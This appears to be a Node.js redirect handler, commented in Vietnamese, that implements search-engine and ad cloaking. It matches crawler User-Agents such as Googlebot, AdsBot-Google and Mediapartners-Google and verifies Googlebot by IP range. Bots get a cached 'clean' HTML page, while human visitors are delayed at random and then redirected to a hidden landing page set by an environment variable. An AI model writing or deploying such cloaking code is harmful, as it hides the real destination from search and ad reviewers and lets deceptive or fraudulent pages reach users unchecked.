const path = require('path');
const ipRangeCheck = require('ip-range-check');
const fs = require('fs');
require('dotenv').config();

// Cache file HTML tĩnh khi khởi động
let cachedHtml = null;
const htmlPath = path.join(__dirname, '../view/index.html');
fs.readFile(htmlPath, 'utf8', (err, data) => {
  if (!err) cachedHtml = data;
  else console.error('Không thể cache file HTML:', err);
});

// Ghi log redirect vào file log
const logStream = fs.createWriteStream(path.join(__dirname, '../redirect.log'), { flags: 'a' });
function logRedirect(info) {
  logStream.write(`[${new Date().toISOString()}] ${info}\n`);
}

const knownGoogleBotIPs = [
  // Dải IP Googlebot chính thức (ví dụ, có thể mở rộng thêm)
  '66.249.64.0/19',
  '64.233.160.0/19',
  '72.14.192.0/18',
  '203.208.60.0/24',
  '74.125.0.0/16',
  '209.85.128.0/17',
  '216.239.32.0/19',
  '66.102.0.0/20',
  '64.18.0.0/20',
  '207.126.144.0/20',
  '173.194.0.0/16',
  '108.177.8.0/21',
  '35.191.0.0/16',
  '130.211.0.0/22',
];

function isGoogleBot(userAgent, req) {
  const botPatterns = [
    /googlebot/i,
    /adsbot-google/i,
    /mediapartners-google/i,
    /apis-google/i,
    /feedfetcher-google/i,
    /google favicon/i,
    /google web preview/i,
    /google-read-aloud/i,
    /duplexweb-google/i,
    /google-speakr/i,
    /bingbot/i,
    /slurp/i,
    /duckduckbot/i,
    /baiduspider/i,
    /yandexbot/i,
    /sogou/i,
    /exabot/i,
    /facebot/i,
    /ia_archiver/i
  ];
  const isBotUA = botPatterns.some((re) => re.test(userAgent));
  if (!isBotUA) return false;
  // Kiểm tra IP nếu là Googlebot
  if (/googlebot/i.test(userAgent)) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
    if (!ipRangeCheck(ip, knownGoogleBotIPs)) {
      console.warn('⚠️ Googlebot UA nhưng IP không hợp lệ:', ip);
      return false;
    }
  }
  return true;
}

exports.handleRedirect = async (req, res) => {
  const ua = req.headers['user-agent'] || '';
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip;
  console.log('🔍 UA:', ua);

  const LANDING_PAGE_URL = process.env.LANDING_PAGE_URL;
  if (!LANDING_PAGE_URL) {
    console.error('❌ Thiếu biến môi trường LANDING_PAGE_URL');
    return res.status(500).send('Server misconfiguration');
  }

  // Nếu là bot (dùng regex), riêng Googlebot kiểm tra thêm IP
  if (isGoogleBot(ua, req)) {
    console.log('🤖 Bot hợp lệ → trả HTML sạch');
    logRedirect(`Bot: UA=${ua} IP=${ip}`);
    return res.send(cachedHtml || 'Đang tải...');
  }

  // Người dùng thật, delay cấu hình qua biến môi trường
  const minDelay = parseInt(process.env.REDIRECT_MIN_DELAY_MS || '300', 10);
  const maxDelay = parseInt(process.env.REDIRECT_MAX_DELAY_MS || '500', 10);
  const delay = Math.floor(minDelay + Math.random() * (maxDelay - minDelay));
  await new Promise(r => setTimeout(r, delay));
  console.log('🏃 Người dùng thật → redirect đến landing page (User-Agent: ' + ua + ')');
  logRedirect(`User: UA=${ua} IP=${ip} Redirected to ${LANDING_PAGE_URL}`);
  return res.redirect(302, LANDING_PAGE_URL);
};
